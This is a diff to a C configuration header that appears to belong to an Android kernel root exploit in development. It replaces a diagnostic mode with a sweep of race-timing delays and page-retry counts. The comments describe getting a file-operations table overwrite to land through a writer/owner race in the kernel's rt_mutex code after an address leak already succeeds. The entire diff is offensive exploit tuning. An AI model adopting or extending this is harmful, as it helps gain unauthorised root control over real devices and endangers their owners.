@@ -4,15 +4,16 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "pa2q-S936WVLU4AYDQ-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
-/* TEMPORARY DIAGNOSTIC (revert before production): SHIFT=1 proved worse
- * than 0 (24/24 leak-stage reclaim misses), so back to default 0.
- * FRESH_P0_SESSION + DATA_ALIAS_DIAG_ONLY stops before the misc_fops
- * write and reads the misc area back through the proven pipe oracle:
- * observed==ashmem_fops table means profile+alias arithmetic are right
- * and only the trigger write misses; garbage means an addressing bug. */
-#define APP_REQUIRE_FRESH_P0_SESSION 1
-#define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
-#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
+/* 6.6.30 AYDQ: the fops write never lands with the default 20-90ms writer
+ * delays (leak works, misc stays pristine, no panics). Disassembly of this
+ * kernel's task_blocks_on_rt_mutex shows the write paths are skipped unless
+ * the owner observes contention at the critical instant, which is pure
+ * writer/owner overlap (timing). Sweep widely + retry more pages per
+ * attempt. Drop back to defaults once the working delay is known. */
+#define APP_FOPS_ROUTE_DELAY_LIST \
+  0, 2000, 5000, 8000, 12000, 15000, 20000, 25000, 30000, 40000, 50000, \
+  60000, 70000, 80000, 90000, 100000, 125000, 150000
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 4
 #else
 #define BUILD_VARIANT_LABEL "pa2q-S936WVLU4AYDQ-root-umh"
 #endif
